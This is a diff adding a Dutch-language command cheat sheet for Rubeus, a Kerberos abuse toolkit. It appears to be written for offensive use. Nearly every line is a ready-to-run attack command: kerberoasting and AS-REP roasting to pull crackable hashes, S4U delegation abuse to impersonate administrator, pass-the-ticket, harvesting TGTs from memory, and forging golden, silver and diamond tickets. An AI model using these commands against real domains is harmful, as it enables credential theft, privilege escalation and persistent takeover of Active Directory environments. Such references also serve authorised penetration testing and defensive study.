@@ -1,0 +1,58 @@
+# Rubeus — Kerberos misbruik toolkit (C#)
+# Alles-in-één tool voor Kerberos aanvallen: roasting, ticket manipulatie, delegatie misbruik
+#
+# === Syntax ===
+# Rubeus.exe <commando> [opties]
+#
+# === Commando's ===
+# asreproast   AS-REP roasting (accounts zonder pre-auth)
+# kerberoast   Kerberoasting (service ticket hashes)
+# hash         Wachtwoord naar RC4/AES hash
+# s4u          S4U2self/S4U2proxy constrained delegation
+# ptt          Pass-the-Ticket (ticket in geheugen laden)
+# monitor      Continu nieuwe TGTs monitoren
+# harvest       Alle TGTs uit geheugen oogsten
+# tgtdeleg     Haal bruikbaar TGT via Kerberos delegatie trick
+# golden       Golden Ticket aanmaken
+# silver       Silver Ticket aanmaken
+# diamond      Diamond Ticket aanmaken
+# renew        Ticket vernieuwen
+# describe     Ticket decoderen en tonen
+#
+# === Belangrijkste opties ===
+# /user:USER          Doelgebruiker
+# /domain:DOMAIN      Doeldomein
+# /dc:DC              Domain Controller
+# /password:PASS      Wachtwoord
+# /rc4:HASH           NT hash
+# /aes256:KEY         AES256 sleutel
+# /ticket:BASE64      Ticket (base64)
+# /outfile:FILE       Uitvoer naar bestand
+# /nowrap             Geen regelafbreking in base64
+# /format:hashcat     Hashcat-compatibel formaat
+#
+# === Voorbeelden ===
+# -- Kerberoasting --
+Rubeus.exe kerberoast /outfile:hashes.txt
+Rubeus.exe kerberoast /user:USER /domain:DOMAIN /dc:DC /nowrap
+# -- AS-REP Roasting --
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+Rubeus.exe asreproast /user:USER /domain:DOMAIN /dc:DC
+# -- Constrained Delegation (S4U) --
+Rubeus.exe s4u /user:USER /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/TARGET /dc:DC /nowrap
+Rubeus.exe s4u /ticket:BASE64 /impersonateuser:administrator /msdsspn:cifs/TARGET /altservice:ldap /nowrap
+# -- Pass-the-Ticket --
+Rubeus.exe ptt /ticket:BASE64
+# -- Ticket harvest & monitor --
+Rubeus.exe harvest /interval:30
+Rubeus.exe monitor /interval:30 /nowrap
+# -- TGT via delegatie --
+Rubeus.exe tgtdeleg /nowrap
+# -- Golden/Silver/Diamond Ticket --
+Rubeus.exe golden /rc4:HASH /domain:DOMAIN /sid:S-1-5-21-... /user:administrator /nowrap
+Rubeus.exe silver /rc4:HASH /domain:DOMAIN /sid:S-1-5-21-... /user:administrator /service:cifs/TARGET /nowrap
+Rubeus.exe diamond /krbkey:AES256KEY /user:USER /password:PASS /enctype:aes /domain:DOMAIN /dc:DC /nowrap
+# -- Hash berekenen --
+Rubeus.exe hash /password:PASS /user:USER /domain:DOMAIN
+# -- Ticket beschrijven --
+Rubeus.exe describe /ticket:BASE64
